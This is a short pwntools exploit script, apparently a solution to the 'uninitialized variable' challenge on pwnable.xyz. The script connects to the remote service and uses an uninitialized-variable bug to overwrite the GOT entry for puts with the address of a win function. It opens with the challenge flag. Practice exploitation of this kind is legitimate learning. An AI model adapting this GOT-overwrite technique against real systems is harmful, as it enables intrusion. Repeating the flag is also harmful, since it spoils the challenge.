# FLAG{uninitializ3d_variabl3_ch3ck3d}
from pwn import *

elf = context.binary = ELF('challenge', checksec=False) # needs to run multiple times to predict alligment

# r = process(elf.path) #elf.path
r = remote('svc.pwnable.xyz', 30011)    

puts = p64(elf.got.puts)
win = p64(elf.sym.win)

def init(option):
    r.recvuntil(b">")
    r.sendline(option)

def create_user(payload):
    r.recvuntil(b"Name:")
    r.send(payload)
    r.recvuntil(b"Age:")
    r.sendline(b'99')

def edit_usr(payload):
    r.recvuntil(b"Name:")
    r.send(payload)
    r.recvuntil(b"Age:")
    r.sendline(b'99')

payload = b"A" * 16 + puts

init('1')
create_user("A")
init('3')
edit_usr(payload)
init('1')
create_user(win) 
r.interactive()